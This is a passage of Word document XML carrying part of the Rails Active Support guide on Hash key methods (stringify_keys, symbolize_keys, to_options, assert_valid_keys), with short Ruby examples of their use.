    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5183"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2D1C1E9F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="64A39D6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{nil</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; nil, 1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :a}.stringify_keys</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73DAD4A1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {"" =&gt; nil, "a" =&gt; :a, "1" =&gt; 1}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2ACF9699" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The result in case of collision is undefined:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3B65F5CB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78D14771" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{"a"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2}.stringify_keys</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FAEAE6B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {"a" =&gt; 2}, in my test, can't rely on this result though</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="51934C0E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method may be useful for example to easily accept both symbols and strings as options. For instance </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionView::Helpers::FormHelper</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defines: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967982C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1AD990BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>to_check_box_tag(options = {}, checked_value = "1", unchecked_value = "0")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2791E8AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  options = options.stringify_keys</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2397AB55" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  options["type"] = "checkbox"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C94B319" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FA78A0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="36459119" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The second line can safely access the “type” key, and let the user to pass either </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or “type”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DC4001" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There’s also the bang variant </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>stringify_keys!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that stringifies keys in the very receiver.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D902AA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/keys.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC001CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.4.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>symbolize_keys</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>symbolize_keys!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57123931" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>symbolize_keys</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a hash that has a symbolized version of the keys in the receiver, where possible. It does so by sending </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_sym</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to them:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5423"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2DA0B9FC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7128E24B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{nil</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; nil, 1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, "a"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "a"}.symbolize_keys</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="487E3AC0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {1 =&gt; 1, nil =&gt; nil, :a =&gt; "a"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0A0BB10C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Note in the previous example only one key was symbolized.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D93CB2F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The result in case of collision is undefined:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="55EA8751" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="29E6C243" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{"a"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2}.symbolize_keys</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14B7454E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {:a =&gt; 2}, in my test, can't rely on this result though</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2156214B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method may be useful for example to easily accept both symbols and strings as options. For instance </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionController::UrlRewriter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defines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92740FD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0047FF2F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rewrite_path(options)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="651565BE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  options = options.symbolize_keys</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00ED28A8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  options.update(options[:params].symbolize_keys) if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options[:params]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="253D75D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41DEBDE1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="11F4D66C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The second line can safely access the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:params</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> key, and let the user to pass either </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:params</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or “params”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D29CA9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There’s also the bang variant </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>symbolize_keys!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that symbolizes keys in the very receiver.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D0FEC6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/keys.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66CAC3AD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.4.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_options!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC1A435" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_options!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are respectively aliases of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>symbolize_keys</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>symbolize_keys!</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC54F5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/keys.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1282488D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.4.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_valid_keys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2611AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_valid_keys</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> receives an arbitrary number of arguments, and checks whether the receiver has any key outside that white list. If it does </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ArgumentError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is raised.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5688"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2257BBF3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E810C7C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.assert_valid_keys(:a)  # passes</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67C8EDCD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.assert_valid_keys("a") # ArgumentError</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1AD21107" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Record does not accept unknown options when building associations for example. It implements that control via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_valid_keys</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891E63C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07E3F26B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>mattr_accessor :valid_keys_for_has_many_association</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ED7A12D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@@valid_keys_for_has_many_association</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= [</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="414F1EED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :class_name, :table_name, :foreign_key, :primary_key,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1362534D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :dependent,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E226559" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :select, :conditions, :include, :order, :group, :having, :limit, :offset,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4896DFE6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  :as, :through, :source, :source_type,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F1848DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
